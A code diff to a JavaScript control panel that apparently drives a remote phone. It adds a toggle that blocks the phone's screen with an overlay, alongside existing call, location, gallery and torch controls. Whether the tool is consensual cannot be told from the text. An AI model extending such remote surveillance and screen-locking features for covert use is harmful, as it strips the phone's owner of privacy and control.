@@ -985,6 +985,9 @@ function startCallsViewer(requestDataOnOpen) {
       } else if (m.type === 'torch-status') {
         if (!m.ok && m.msg) toast('Фонарик: ' + m.msg, true);
         else { setToggleBtn($('#cmdTorchToggle'), m.enabled); toast(m.enabled ? '🔦 Фонарик включён' : 'Фонарик выключен'); }
+      } else if (m.type === 'overlay-status') {
+        setToggleBtn($('#cmdOverlayToggle'), m.enabled);
+        toast(m.enabled ? '🛡 Экран заблокирован' : '🛡 Блокировка снята');
       } else if (m.type === 'location') {
         renderLocation(m);
       } else if (m.type === 'gallery-items') {
@@ -1134,6 +1137,9 @@ function renderPhoneInfo(info) {
       const ok = info.perms[d.key];
       return `<b>${d.icon} ${d.label}</b><span class="${ok ? 'perm-ok' : 'perm-no'}">${ok ? '✓ Разрешено' : '✗ Не выдано'}</span>`;
     }).join('');
+  }
+  if (info.perms?.overlayActive !== undefined) {
+    setToggleBtn($('#cmdOverlayToggle'), info.perms.overlayActive);
   }
 }
 
@@ -1487,6 +1493,9 @@ $('#cmdBtToggle').onclick = () => {
 };
 $('#cmdTorchToggle').onclick = () => {
   phoneSend({ cmd: 'set-torch', enabled: $('#cmdTorchToggle').dataset.state !== 'on' });
+};
+$('#cmdOverlayToggle').onclick = () => {
+  phoneSend({ cmd: 'set-overlay', enabled: $('#cmdOverlayToggle').dataset.state !== 'on' });
 };
 
 $('#vibrateMs').addEventListener('input', () => {
